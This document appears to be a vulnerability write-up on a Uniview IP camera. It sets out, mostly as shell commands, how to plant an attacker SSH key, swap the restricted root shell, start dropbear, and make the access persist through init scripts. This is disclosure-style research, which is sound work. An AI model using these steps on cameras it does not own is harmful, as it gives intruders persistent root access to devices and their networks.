# Shell Root Access

## Overview

Persistent remote SSH root access with attacker-controlled authentication was established over the local network by deploying `dropbear` on the live firmware and configuring public key authetnication.
This builds directly on the shell escape achieved via the `checksysready.sh` modification (see `shell_escape.md`).

## Root Cause

The device ships with `dropbear` installed but not running. After obtaining a root shell on the live firmware, nothing prevents an attacker from starting `dropbear`
and installing arbitrary SSH keys. `/etc/shells` is writable, and no integrity verification exists on the runtime environment.

## Prequisites

- Root shell of live firmware (see `shell_escape.md`)
- IPC device connected to a local network via ethernet
- Attacker machine on the same subnet

## Method

Within the root shell, confirm the camera's address:

```bash
ip addr
```

By default the camera is configured with a static IP of `192.168.1.13/24`. Ensure that the attacking machine is on the same subnet.

Generate an RSA key on the attacking machine:

```bash
ssh-keygen -t rsa -f ~/.ssh/uniview_ipc_key
```

On the camera, create the `.ssh` directory and copy the public key onto the device:

```bash
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "<contents of uniview_ipc_key.pub>" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

The default root shell is `/usr/bin/uvsh`. Replace it with `/bin/sh` and register it as a valid shell, otherwise `dropbear` will not accept the login:

```bash
sed -i 's|/usr/bin/uvsh|/bin/sh|' /etc/passwd
echo "/bin/sh" >> /etc/shells
```

Generate the host keys and startup dropbear:

```bash
mkdir -p /etc/dropbear
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key
dropbear -F -E -s -p 2222
```

The `-s`flag disables password authentication, allowing key-only access.

Finally from the attacker machine, connect:

```bash
ssh -i ~/.ssh/uniview_ipc_key \
    -o IdentitiesOnly=yes \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    root@192.168.1.13 -p 2222
```

Note: the dropbear version on the camera accepts `ssh-rsa` key format which is deprecated. As a result, `PubkeyAcceptedAlgorithms=+ssh-rsa` is required to connect.

## Persistence

This access does not persist across reboot by default, as `/etc/passwd`, `/etc/shells`, and the dropbear host keys reside on the ramdisk overlay.
However, since the underlying `/program` partition is writable from single user mode, `dropbear` startup can be added to an init script using the same method described in `shell_escape.md`, achieving full persistence.

## Impact

- Unauthenticated remote root shell over LAN
- No exploitation required, only prior physical access and default credentials
- Lateral movement possible to any host reachable from the camera's network interface

## Threat Model

Attacker with:

- Physical UART access OR
- Access to default credentials over LAN
